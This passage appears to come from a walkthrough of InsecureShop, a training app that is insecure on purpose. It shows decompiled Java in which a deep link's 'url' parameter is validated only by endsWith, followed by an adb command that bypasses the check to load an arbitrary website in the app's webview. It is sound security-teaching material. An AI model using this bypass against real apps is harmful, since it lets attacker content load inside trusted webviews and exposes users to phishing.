In the same activity ie. `com.insecureshop.WebActivity`, we can find another if condition.

```java
 if (StringsKt.equals$default(uri.getPath(), "/webview", false, 2, null)) {
                    Intent intent2 = getIntent();
                    Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
                    Uri data2 = intent2.getData();
                    if (data2 == null) {
                        Intrinsics.throwNpe();
                    }
                    String queryParameter = data2.getQueryParameter("url");
                    if (queryParameter == null) {
                        Intrinsics.throwNpe();
                    }
                    Intrinsics.checkExpressionValueIsNotNull(queryParameter, "intent.data!!.getQueryParameter(\"url\")!!");
                    if (StringsKt.endsWith$default(queryParameter, "insecureshopapp.com", false, 2, (Object) null)) {
                        Intent intent3 = getIntent();
                        Intrinsics.checkExpressionValueIsNotNull(intent3, "intent");
                        Uri data3 = intent3.getData();
                        data = data3 != null ? data3.getQueryParameter("url") : null;
                    }
                }
```
The validation on the host is by using the .endsWith method, which is insufficient for the task as any host ending with this is acceptable.
Similarly, an arbitrary url will be loaded to the webview using the following command.

`adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/webview?url=http://my-website-insecureshopapp.com"`
